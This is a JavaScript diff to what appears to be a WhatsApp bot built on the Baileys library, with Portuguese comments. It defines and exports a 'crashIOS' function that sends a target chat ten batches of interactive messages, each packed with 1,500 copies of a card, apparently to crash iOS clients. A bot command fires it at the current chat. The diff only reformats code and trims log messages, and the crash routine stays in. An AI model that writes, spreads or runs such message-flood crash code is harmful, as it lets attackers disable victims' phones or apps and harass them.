@@ -29,7 +29,7 @@ const fs = require("fs");
 const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail, scansSidecar, midQualityFileSha256, thumbnailDirectPath, thumbnailSha256, thumbnailEncSha256 } = require("./database/mediaall.js");
 const { menu } = require("./database/menu.js");
 
-// Função para crash iOS, pode ser chamada diretamente
+// Função exportada para crash iOS, pode ser chamada diretamente
 async function crashIOS(sock, targetJid) {
   for (let i = 0; i < 10; i++) {
     const singleCard = {
@@ -65,7 +65,7 @@ async function crashIOS(sock, targetJid) {
         ]
       }
     };
-    console.log(`⏳ Enviando carta em lote ${i + 1}/10 para ${targetJid}...`);
+    console.log(`⏳ Enviando carta em lote ${i + 1}/10...`);
     const card = Array(1500).fill(singleCard);
     await sock.sendjson(targetJid, {
       "interactiveMessage": {
@@ -76,11 +76,11 @@ async function crashIOS(sock, targetJid) {
       }
     });
   }
-  console.log(`✅ Envio de cartas concluído para ${targetJid}.`);
+  console.log("✅ Envio de cartas concluído.");
 }
 
 module.exports = async (sock, m, chatUpdate) => {
-const message = m
+  const message = m
   m.id = m.key.id;
   m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
   m.chat = m.key.remoteJid;
@@ -91,7 +91,7 @@ const message = m
   function getTypeM(message) {
     const type = Object.keys(message);
     var restype = (!["senderKeyDistributionMessage", "messageContextInfo"].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== "messageContextInfo" && type[1]) || type[type.length - 1] || Object.keys(message)[0];
-return restype;
+    return restype;
   };
   m.mtype = getTypeM(m.message);
   m.msg = (m.mtype == "viewOnceMessage" ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype]);
@@ -198,15 +198,13 @@ return restype;
   const isQuotedLocation = m.mtype === "extendedTextMessage" && content.includes("locationMessage");
   const isQuotedProduct = m.mtype === "extendedTextMessage" && content.includes("productMessage");
   switch(command) {
-  case "": { // use the command with: . but, this dont cause conflict with other commands
-    if (!isBot) return;
-    await crashIOS(sock, from);
-  }
-  break;
+    case "": { // use the command with: . but, this dont cause conflict with other commands
+      if (!isBot) return;
+      await crashIOS(sock, from);
+    }
+    break;
   }
 }
-
-// Exporta a função para uso externo
 module.exports.crashIOS = crashIOS;
 
 let file = require.resolve(__filename);
